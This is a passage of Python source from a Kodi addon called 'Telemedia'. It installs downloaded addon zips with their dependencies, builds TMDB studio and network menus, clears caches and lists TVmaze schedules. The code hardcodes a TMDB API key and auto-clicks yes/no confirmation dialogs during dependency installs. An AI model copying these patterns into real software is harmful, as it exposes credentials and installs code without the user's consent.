                                    all_addons[c_f_name].append({'version':new_addon_ver,'ex':ex,'f_name':f_name,'id':idd,'m_id':items_in['id'],'c_id':items_in['id'],'size':str(f_size2)})
                                    
    logging.warning('All M')
    m=[]
    for tt in all_repo_info:
        regex='setting f_name="(.+?)" "display_name"="(.+?)" icon="(.+?)" fanart="(.+?)" description="(.+?)"'
        m=m+re.compile(regex,re.DOTALL).findall(tt)
        logging.warning(m)
    all_data_addon={}
    logging.warning('All M')
    for f_name,disp_name,icon,fanart,plot in m:
        logging.warning(plot)
        all_data_addon[f_name]={'disp_name':disp_name,'icon':icon,'fanart':fanart,'plot':plot}
    logging.warning('All I')
    for items in all_addons:
        link_data={}
        name=items
       
        f_lk=json.dumps(all_addons[items])
        f_size2=all_addons[items][0]['size']
        color='white'
        if all_addons[items][0]['ex']==False:
            color='lightblue'
        title=name
        fan=' '
        icon=' '
        plot=' '
        logging.warning(items)
        if items in all_data_addon:
            
            title=all_data_addon[items]['disp_name']
            icon=all_data_addon[items]['icon']
            fan=all_data_addon[items]['fanart']
            plot=all_data_addon[items]['plot']
        addNolink('[COLOR %s]'%color+ title+'[/COLOR]',f_lk ,47,False, iconimage=icon,fan=fan,generes=f_size2,plot=plot,original_title=json.dumps(all_addons))
def multi_install(name,url,original_title):
    from zfile import ZipFile
    
    all_data=json.loads(url)
   
    silent=False
  
    logging.warning(original_title)
    all_avi_addond=json.loads(urllib.unquote_plus(original_title))
    try:
        if os.path.exists(addon_path):
            shutil.rmtree(addon_path)
    except Exception as e:
        logging.warning('error removing folder:'+str(addon_path)+','+str(e))
    if not xbmcvfs.exists(addon_path+'/'):
        os.makedirs(addon_path)
                
    all_ver=[]
    all_d=[]
    for items in all_data:
        all_ver.append(items['version'])
        all_d.append(items['f_name'])
    
    ret = xbmcgui.Dialog().select("Choose", all_ver)
    if ret==-1:
        sys.exit()
    else:
        url=all_data[ret]['id']
        name=all_d[ret]
        logging.warning(name)
        logging.warning(xbmc.getCondVisibility("System.HasAddon(%s)" % name.split('-')[0]))
        logging.warning(url)
        logging.warning(xbmc.getInfoLabel('System.AddonVersion(%s)'%name.split('-')[0]))
        
        num=random.randint(0,60000)
        #Install
        logging.warning('url::'+url)
        
        if silent:
            ok=True
        else:
            ok=xbmcgui.Dialog().yesno(Addon.getLocalizedString(32033),(Addon.getLocalizedString(32033)+' %s?'%name))
        if ok:
            if silent==False:
                dp = xbmcgui.DialogProgress()
                dp.create('Telemedia', '[B][COLOR=yellow]Installing[/COLOR][/B]','')
            
            
            mv_name=os.path.join(addon_path,name)
            logging.warning('Downloading addon')
            addon=download_photo(url,num,name,mv_name)
            xbmc.sleep(1000)
            if silent==False:
                dp.update(0,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Extracting[/COLOR][/B]')
            zf = ZipFile(addon)

            uncompress_size = sum((file.file_size for file in zf.infolist()))

            extracted_size = 0

            for file in zf.infolist():
                extracted_size += file.file_size
                if silent==False:
                    dp.update(int((extracted_size*100.0)/uncompress_size),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Extracting[/COLOR][/B]',file.filename)
                
                zf.extract(member=file, path=addon_extract_path)
            zf.close()
            f_o = os.listdir(addon_extract_path)
            
                
            file = open(os.path.join(addon_extract_path,f_o[0], 'addon.xml'), 'r') 
            file_data= file.read()
            file.close()
            regex='id=(?:"|\')(.+?)(?:"|\')'
            nm=re.compile(regex).findall(file_data)[0]
            if not xbmc.getCondVisibility("System.HasAddon(%s)" % name.split('-')[0]):
                regex='import addon=(?:"|\')(.+?)(?:"|\')'
                dep=re.compile(regex).findall(file_data)
                missing=[]
                if silent==False:
                    dp.update(90,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Dependencies[/COLOR][/B]','')
                zzz=0
                for items in dep:
                    if silent==False:
                        dp.update(int((extracted_size*100.0)/len(items)),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Dependencies[/COLOR][/B]',items)
                    zzz+=1
                    if not xbmc.getCondVisibility("System.HasAddon(%s)" % items):
                        missing.append(items)
                if len(missing)>0:
                    for itemm in missing:
                        if itemm in all_avi_addond:
                            install_addon(itemm,json.dumps(all_avi_addond[itemm][0]),silent=True,Delete=False)
                        else:
                            xbmc.executebuiltin('InstallAddon(%s)'%itemm)
                            zzx=0
                            while not xbmc.getCondVisibility("System.HasAddon(%s)" % itemm):
                                dp.update(int((zzx*100.0)/100),'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Waiting[/COLOR][/B]',itemm)
                                zzx+=1
                                if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):
                                        xbmc.executebuiltin('SendClick(11)')
                                if zzx>100:
                                    break
                                xbmc.sleep(1000)
                    #showText('Missing Dependencies','\n'.join(missing))
                    #return 0
            addon_p=xbmc.translatePath("special://home/addons/")
            #dis_or_enable_addon(nm, enable="false")
            #xbmc.sleep(1000)
            
            files = os.listdir(addon_extract_path)
            logging.warning(os.path.join(addon_p,f_o[0]))
            #if os.path.exists(os.path.join(addon_p,f_o[0])):
            #    shutil.rmtree(os.path.join(addon_p,f_o[0]))
            logging.warning('Copy')
            logging.warning(os.path.join(addon_extract_path,f_o[0]))
            logging.warning(os.path.join( addon_p,f_o[0]))
            not_copied=copyDirTree(os.path.join(addon_extract_path,f_o[0]),os.path.join( addon_p,f_o[0]))
            if len(not_copied)>0:
                showText('File That was not copied', '\n'.join(not_copied))
            #shutil.move(os.path.join(addon_extract_path,f_o[0]), addon_p)
            xbmc.executebuiltin("XBMC.UpdateLocalAddons()")
            if silent==False:
                dp.update(100,'[B][COLOR=green]Telemedia[/COLOR][/B]', '[B][COLOR=yellow]Cleaning[/COLOR][/B]','')
            time.sleep(1)
            dis_or_enable_addon(nm)
            try:
                shutil.rmtree(addon_path)
            except:
                pass
            if silent==False:
                dp.close()
            #'Installed'
            #'Installation complete'
            if silent==False:
                xbmcgui.Dialog().ok(Addon.getLocalizedString(32034),Addon.getLocalizedString(32035))
def movie_prodiction():
    all_d=[]
    if Addon.getSetting("order_networks")=='0':
        order_by='popularity.desc'
    elif Addon.getSetting("order_networks")=='2':
        order_by='vote_average.desc'
    elif Addon.getSetting("order_networks")=='1':
        order_by='first_air_date.desc'
   
    
    aa=addDir3('[COLOR red]Marvel[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=7505&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://yt3.ggpht.com/a-/AN66SAwQlZAow0EBMi2-tFht-HvmozkqAXlkejVc4A=s900-mo-c-c0xffffffff-rj-k-no','https://images-na.ssl-images-amazon.com/images/I/91YWN2-mI6L._SL1500_.jpg','Marvel'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR lightblue]DC Studios[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=9993&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://pmcvariety.files.wordpress.com/2013/09/dc-comics-logo.jpg?w=1000&h=563&crop=1','http://www.goldenspiralmedia.com/wp-content/uploads/2016/03/DC_Comics.jpg','DC Studios'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR lightgreen]Lucasfilm[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=1&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://fontmeme.com/images/lucasfilm-logo.png','https://i.ytimg.com/vi/wdYaG3o3bgE/maxresdefault.jpg','Lucasfilm'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR yellow]Warner Bros.[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=174&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'http://looking.la/wp-content/uploads/2017/10/warner-bros.png','https://cdn.arstechnica.net/wp-content/uploads/2016/09/warner.jpg','SyFy'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR blue]Walt Disney Pictures[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=2&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://i.ytimg.com/vi/9wDrIrdMh6o/hqdefault.jpg','https://vignette.wikia.nocookie.net/logopedia/images/7/78/Walt_Disney_Pictures_2008_logo.jpg/revision/latest?cb=20160720144950','Walt Disney Pictures'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR skyblue]Pixar[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=3&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://elestoque.org/wp-content/uploads/2017/12/Pixar-lamp.png','https://wallpapercave.com/wp/GysuwJ2.jpg','Pixar'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR deepskyblue]Paramount[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=4&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://upload.wikimedia.org/wikipedia/en/thumb/4/4d/Paramount_Pictures_2010.svg/1200px-Paramount_Pictures_2010.svg.png','https://vignette.wikia.nocookie.net/logopedia/images/a/a1/Paramount_Pictures_logo_with_new_Viacom_byline.jpg/revision/latest?cb=20120311200405&format=original','Paramount'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR burlywood]Columbia Pictures[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=5&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://static.tvtropes.org/pmwiki/pub/images/lady_columbia.jpg','https://vignette.wikia.nocookie.net/marveldatabase/images/1/1c/Columbia_Pictures_%28logo%29.jpg/revision/latest/scale-to-width-down/1000?cb=20141130063022','Columbia Pictures'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR powderblue]DreamWorks[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=7&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://www.dreamworksanimation.com/share.jpg','https://www.verdict.co.uk/wp-content/uploads/2017/11/DA-hero-final-final.jpg','DreamWorks'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR lightsaltegray]Miramax[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=14&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://vignette.wikia.nocookie.net/disney/images/8/8b/1000px-Miramax_1987_Print_Logo.png/revision/latest?cb=20140902041428','https://i.ytimg.com/vi/4keXxB94PJ0/maxresdefault.jpg','Miramax'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR gold]20th Century Fox[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=25&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://pmcdeadline2.files.wordpress.com/2017/03/20th-century-fox-cinemacon1.jpg?w=446&h=299&crop=1','https://vignette.wikia.nocookie.net/simpsons/images/8/80/TCFTV_logo_%282013-%3F%29.jpg/revision/latest?cb=20140730182820','20th Century Fox'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR bisque]Sony Pictures[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=34&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://upload.wikimedia.org/wikipedia/commons/thumb/6/63/Sony_Pictures_Television_logo.svg/1200px-Sony_Pictures_Television_logo.svg.png','https://vignette.wikia.nocookie.net/logopedia/images/2/20/Sony_Pictures_Digital.png/revision/latest?cb=20140813002921','Sony Pictures'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR navy]Lions Gate Films[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=35&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'http://image.wikifoundry.com/image/1/QXHyOWmjvPRXhjC98B9Lpw53003/GW217H162','https://vignette.wikia.nocookie.net/fanon/images/f/fe/Lionsgate.jpg/revision/latest?cb=20141102103150','Lions Gate Films'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR beige]Orion Pictures[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=41&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://i.ytimg.com/vi/43OehM_rz8o/hqdefault.jpg','https://i.ytimg.com/vi/g58B0aSIB2Y/maxresdefault.jpg','Lions Gate Films'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR yellow]MGM[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=21&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://pbs.twimg.com/profile_images/958755066789294080/L9BklGz__400x400.jpg','https://assets.entrepreneur.com/content/3x2/2000/20150818171949-metro-goldwun-mayer-trade-mark.jpeg','MGM'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR gray]New Line Cinema[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=12&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://upload.wikimedia.org/wikipedia/en/thumb/0/04/New_Line_Cinema.svg/1200px-New_Line_Cinema.svg.png','https://vignette.wikia.nocookie.net/theideas/images/a/aa/New_Line_Cinema_logo.png/revision/latest?cb=20180210122847','New Line Cinema'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR darkblue]Gracie Films[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=18&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://i.ytimg.com/vi/q_slAJmZBeQ/hqdefault.jpg','https://i.ytimg.com/vi/yGofbuJTb4g/maxresdefault.jpg','Gracie Films'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR goldenrod]Imagine Entertainment[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/movie?api_key=34142515d9d23817496eeb4ff1d223d0&with_companies=23&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://s3.amazonaws.com/fs.goanimate.com/files/thumbnails/movie/2813/1661813/9297975L.jpg','https://www.24spoilers.com/wp-content/uploads/2004/06/Imagine-Entertainment-logo.jpg','Imagine Entertainment'.decode('utf8'))
    all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def tv_neworks():
    all_d=[]
    if Addon.getSetting("order_networks")=='0':
        order_by='popularity.desc'
    elif Addon.getSetting("order_networks")=='2':
        order_by='vote_average.desc'
    elif Addon.getSetting("order_networks")=='1':
        order_by='first_air_date.desc'
    aa=addDir3('[COLOR lightblue]Disney+[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=2739&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://lumiere-a.akamaihd.net/v1/images/image_308e48ed.png','https://allears.net/wp-content/uploads/2018/11/wonderful-world-of-animation-disneys-hollywood-studios.jpg','Disney'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR blue]Apple TV+[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=2552&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://ksassets.timeincuk.net/wp/uploads/sites/55/2019/03/Apple-TV-screengrab-920x584.png','https://www.apple.com/newsroom/videos/apple-tv-plus-/posters/Apple-TV-app_571x321.jpg.large.jpg','Apple'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR red]NetFlix[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=213&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://art.pixilart.com/705ba833f935409.png','https://i.ytimg.com/vi/fJ8WffxB2Pg/maxresdefault.jpg','NetFlix'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR gray]HBO[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=49&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://filmschoolrejects.com/wp-content/uploads/2018/01/hbo-logo.jpg','https://www.hbo.com/content/dam/hbodata/brand/hbo-static-1920.jpg','HBO'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR lightblue]CBS[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=16&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://cdn.freebiesupply.com/logos/large/2x/cbs-logo-png-transparent.png','https://tvseriesfinale.com/wp-content/uploads/2014/10/cbs40-590x221.jpg','HBO'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR purple]SyFy[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=77&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'http://cdn.collider.com/wp-content/uploads/syfy-logo1.jpg','https://imagesvc.timeincapp.com/v3/mm/image?url=https%3A%2F%2Fewedit.files.wordpress.com%2F2017%2F05%2Fdefault.jpg&w=1100&c=sc&poi=face&q=85','SyFy'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR lightgreen]The CW[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=71&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://www.broadcastingcable.com/.image/t_share/MTU0Njg3Mjc5MDY1OTk5MzQy/tv-network-logo-cw-resized-bc.jpg','https://i2.wp.com/nerdbastards.com/wp-content/uploads/2016/02/The-CW-Banner.jpg','The CW'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR silver]ABC[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=2&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'http://logok.org/wp-content/uploads/2014/03/abc-gold-logo-880x660.png','https://i.ytimg.com/vi/xSOp4HJTxH4/maxresdefault.jpg','ABC'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR yellow]NBC[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=6&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://designobserver.com/media/images/mondrian/39684-NBC_logo_m.jpg','https://www.nbcstore.com/media/catalog/product/cache/1/image/1000x/040ec09b1e35df139433887a97daa66f/n/b/nbc_logo_black_totebagrollover.jpg','NBC'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR gold]AMAZON[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=1024&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'http://g-ec2.images-amazon.com/images/G/01/social/api-share/amazon_logo_500500._V323939215_.png','https://cdn.images.express.co.uk/img/dynamic/59/590x/Amazon-Fire-TV-Amazon-Fire-TV-users-Amazon-Fire-TV-stream-Amazon-Fire-TV-Free-Dive-TV-channel-Amazon-Fire-TV-news-Amazon-1010042.jpg?r=1535541629130','AMAZON'.decode('utf8'))
    all_d.append(aa)
    aa=addDir3('[COLOR green]hulu[/COLOR]'.decode('utf8'),domain_s+'api.themoviedb.org/3/discover/tv?api_key=34142515d9d23817496eeb4ff1d223d0&with_networks=453&language=he&sort_by={0}&timezone=America%2FNew_York&include_null_first_air_dates=false&page=1'.format(order_by),14,'https://i1.wp.com/thetalkinggeek.com/wp-content/uploads/2012/03/hulu_logo_spiced-up.png?resize=300%2C225&ssl=1','https://www.google.com/url?sa=i&rct=j&q=&esrc=s&source=images&cd=&cad=rja&uact=8&ved=2ahUKEwi677r77IbeAhURNhoKHeXyB-AQjRx6BAgBEAU&url=https%3A%2F%2Fwww.hulu.com%2F&psig=AOvVaw0xW2rhsh4UPsbe8wPjrul1&ust=1539638077261645','hulu'.decode('utf8'))
    all_d.append(aa)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def get_free_space():
    import subprocess
    if xbmc .getCondVisibility ('system.platform.android'):#line:1878
        import subprocess
        df = subprocess.Popen(['df', '/storage/emulated/'], stdout=subprocess.PIPE)
        output = df.communicate()
        logging.warning(output)
        
        output=output[0]
        info = output.split('\n')[1].split()
        logging.warning(info)
        size = float(info[1].replace('G', '').replace('M', '')) * 1000000000.0
        logging.warning(size)
        size = size - (size % float(info[-1]))
        logging.warning(size)
        available = float(info[3].replace('G', '').replace('M', '')) * 1000000000.0
        logging.warning(available)
        available = available - (available % float(info[-1]))
        logging.warning(available)
        space= int(round(available)), int(round(size))
         
    else:
        process = subprocess.Popen('cmd.exe /k ', shell=True, stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=None)
        process.stdin.write("wmic logicaldisk get size,freespace,caption\n")
        space,e=process.communicate()
      
        process.stdin.close()
    logging.warning(space)
    logging.warning(user_dataDir)
    return space
def clean_space():
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    dp = xbmcgui.DialogProgress()
            
    dp.create('Telemedia', '[B][COLOR=yellow]Cleaning[/COLOR][/B]','')
    HOME= xbmc.translatePath('special://home/')
    USERDATA= os.path.join(HOME,      'userdata')
    ADDONS           = os.path.join(HOME,      'addons')
    
    THUMBS= os.path.join(USERDATA,  'Thumbnails')
    TEMPDIR= xbmc.translatePath('special://temp')
    PACKAGES= os.path.join(ADDONS,    'packages')
    remove_all=[THUMBS,TEMPDIR,PACKAGES]
    for items in remove_all:
        dp.update(0, 'Please Wait...','Removing File', items )
        shutil.rmtree(items,ignore_errors=True, onerror=None)
    DATABASE         = os.path.join(USERDATA,  'Database')
    try:
        os.mkdir(THUMBS)
    except:
        pass
    try:
        os.mkdir(TEMPDIR)
    except:
        pass
    try:
        os.mkdir(PACKAGES)
    except:
        pass
    arr = os.listdir(DATABASE)
    
    dp.update(0, 'Please Wait...','Clean DB', '' )
    for items in arr:
        if 'Textures' in items:
            try:
                found=(os.path.join(DATABASE,items))
            except:
                pass
    cacheFile=found
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("DELETE  FROM path")
    dbcur.execute("DELETE  FROM sizes")
    dbcur.execute("DELETE  FROM texture")
    dbcur.execute("DELETE  FROM version")
    dbcon.commit()
    dbcur.close()
    dbcon.close()
    dp.close()
    xbmcgui.Dialog().ok('Clean','Done.')
def calendars():
        import datetime
        datetime_get = (datetime.datetime.utcnow() - datetime.timedelta(hours = 5))
        m = "January|February|March|April|May|June|July|August|September|October|November|December".encode('utf-8').split('|')
        try: months = [(m[0], 'January'), (m[1], 'February'), (m[2], 'March'), (m[3], 'April'), (m[4], 'May'), (m[5], 'June'), (m[6], 'July'), (m[7], 'August'), (m[8], 'September'), (m[9], 'October'), (m[10], 'November'), (m[11], 'December')]
        except: months = []

        d = "Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday".encode('utf-8').split('|')
        try: days = [(d[0], 'Monday'), (d[1], 'Tuesday'), (d[2], 'Wednesday'), (d[3], 'Thursday'), (d[4], 'Friday'), (d[5], 'Saturday'), (d[6], 'Sunday')]
        except: days = []
        list=[]
        calendar_link = 'https://api.tvmaze.com/schedule?date=%s'
        for i in range(0, 30):
            if 1:#try:
                name = (datetime_get - datetime.timedelta(days = i))
                name = ("[B]%s[/B] : %s" % (name.strftime('%A'), name.strftime('%d %B'))).encode('utf-8')
                for m in months: name = name.replace(m[1], m[0])
                for d in days: name = name.replace(d[1], d[0])
                try: name = name.encode('utf-8')
                except: pass

                url = calendar_link % (datetime_get - datetime.timedelta(days = i)).strftime('%Y-%m-%d')

                list.append({'name': name, 'url': url, 'image': 'calendar.png', 'action': 'calendar'})
            #except:
            #    pass
        
        return list
def c_get_tv_maze(urls,original_image):
   all_d=[]
   for url in urls:
    logging.warning(url)
    x=requests.get(url,headers=base_header).json()
    
    for items in x:
        season=str(items['season'])
        if items['number']==None:
            episode='1'
        else:
            episode=str(int(items['number']))
        
        if len(episode)==1:
          episode_n="0"+episode
        else:
           episode_n=episode
        if len(season)==1:
          season_n="0"+season
        else:
          season_n=season
        
        id=items['show']['externals']['thetvdb']
        if id==None:
            id=items['show']['externals']['imdb']
            id='imdb'+str(id)
        else:
            id='tvdb'+str(id)
            
        '''
        url2=domain_s+'api.themoviedb.org/3/find/%s?api_key=34142515d9d23817496eeb4ff1d223d0&external_source=tvdb_id&language=%s'%(imdb_id,lang)
        logging.warning(items['show']['externals'])
        html_im=requests.get(url2).json()
       
        data=html_im['tv_results']
        if len(data)==0:
            continue
        else:
            data=data[0]
        title=data['name']+' -S%sE%s - '%(season_n,episode_n)
        plot=items['airdate']+'\n'+data['overview']
        if data['poster_path']==None:
            data['poster_path']=''
        if data['backdrop_path']==None:
            data['backdrop_path']=''
        icon='https://image.tmdb.org/t/p/original/'+data['poster_path']
        fan='https://image.tmdb.org/t/p/original/'+data['backdrop_path']
        id=str(data['id'])
        original_name=data['original_name']
        eng_name=original_name
        if 'first_air_date' in data:
           year=str(data['first_air_date'].split("-")[0])
        elif 'release_date' in data:
            year=str(data['release_date'].split("-")[0])
        else:
            year='0'
        '''
        title=items['show']['name']+' -S%sE%s- %s'%(season_n,episode_n,items['name'])
        plot=items['show']['summary']
        if plot==None:
            plot=''
        plot=items['airdate']+'\n'+plot
        icon=' '
        if items['show']['image']==None:
            icon=original_image
        else:
         for it in items['show']['image']:
           icon=items['show']['image'][it]
        fan=icon
       
        original_name=items['show']['name']
        eng_name=items['show']['name']
        if 'premiered' in items:
           year=str(data['premiered'].split("-")[0])
       
        else:
            year='0'
        all_g=[]
        for it in items['show']['genres']:
            all_g.append(it)
        generes=','.join(all_g)
        
        aa=addDir3( title, 'www',20, icon,fan,plot,data=year,generes=generes,original_title=original_name,id=id,season=season,episode=episode,eng_name=eng_name,show_original_year=year,heb_name=original_name)
        all_d.append(aa)
   return all_d
def get_tv_maze(url,original_image):
    urls = [i['url'] for i in calendars()][:5]
    logging.warning(urls)
    
    all_d=c_get_tv_maze(urls,original_image)
    
    #time_to_save=int(Addon.getSetting("save_time"))
    #all_d=cache.get(c_get_tv_maze, time_to_save, urls,original_image)
    xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
params=get_params()
for items in params:
   params[items]=params[items].replace(" ","%20")
url=None
name=None
mode=None
iconimage=None
fanart=None
resume=None
c_id=None
m_id=None
description=' '
original_title=' '
fast_link=''
data=0
id=' '
saved_name=' '
prev_name=' '
isr=0
no_subs=0
season="%20"
episode="%20"
show_original_year=0
heb_name=' '
year=' '
tmdbid=' '
eng_name=' '
dates=' '
data1='[]'
file_name=''
fav_status='false'
only_torrent='no'
only_heb_servers='0'
new_windows_only=False
meliq='false'
tv_movie='movie'
last_id='0$$$0$$$0$$$0'
nextup='true'
dd=''
try:
        url=urllib.unquote_plus(params["url"])
       
except:
        
        pass
try:
        tv_movie=(params["tv_movie"])
except:
        pass
try:
        name=urllib.unquote_plus(params["name"])
except:
        pass
try:
        iconimage=urllib.unquote_plus(params["iconimage"])
except:
        pass
try:        
